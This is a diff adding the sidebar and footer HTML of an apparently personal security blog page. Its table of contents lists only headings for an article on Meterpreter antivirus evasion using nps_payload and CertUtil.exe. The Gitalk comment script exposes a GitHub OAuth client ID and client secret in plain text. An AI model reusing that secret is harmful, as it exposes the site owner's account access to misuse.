+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Meterpreter-Bypassing-AntiVirus"><span class="nav-number">1.</span> <span class="nav-text">Meterpreter Bypassing AntiVirus</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、nps-payload"><span class="nav-number">1.1.</span> <span class="nav-text">一、nps_payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、使用CertUtil-exe进行内存中注入"><span class="nav-number">1.2.</span> <span class="nav-text">二、使用CertUtil.exe进行内存中注入</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
